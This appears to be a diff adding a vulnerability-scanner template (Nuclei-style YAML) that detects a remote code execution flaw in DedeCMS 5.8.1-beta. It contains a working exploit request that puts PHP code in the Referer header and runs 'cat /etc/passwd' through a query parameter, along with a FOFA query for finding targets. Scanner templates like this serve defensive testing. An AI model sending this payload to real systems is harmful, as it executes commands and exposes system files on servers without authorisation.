@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - regex:
+            - root:[x*]:0:0
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /plus/flink.php?dopost=save&c=cat%20/etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+          Referer: <?php "system"($c);die;/*ref
+id: dedecms-rce
+info:
+    author: ritikchaddha
+    description: |
+        DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.
+    metadata:
+        fofa-query: app="DedeCMS"
+        max-request: 1
+        verified: true
+    name: DedeCMS 5.8.1-beta - Remote Code Execution
+    reference:
+        - https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html
+        - https://sectime.top/post/1d114771.html
+    severity: critical
+    tags:
+        - dedecms
+        - flink
+        - DedeCMS
